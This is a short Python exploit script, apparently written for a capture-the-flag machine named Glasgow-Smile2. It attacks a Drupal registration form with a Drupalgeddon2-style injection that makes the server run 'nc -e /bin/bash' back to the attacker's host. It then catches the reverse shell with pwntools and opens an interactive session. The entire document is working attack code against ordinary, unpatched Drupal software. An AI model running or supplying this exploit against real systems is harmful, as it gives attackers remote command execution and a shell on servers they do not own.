#!/usr/bin/python3
from pwn import *
import requests

if len(sys.argv) < 3:
    print(f"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <rhost> <lhost>\n")
    exit(1)

def cmd():
    time.sleep(1)
    target = f"http://{sys.argv[1]}/Glasgow---Smile2/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    data = { 'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': f"nc -e /bin/bash {sys.argv[2]} 443" }
    requests.post(target, data=data)

threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=30).wait_for_connection()
shell.sendline(b"export HOME=/var/www TERM=xterm")
shell.interactive()
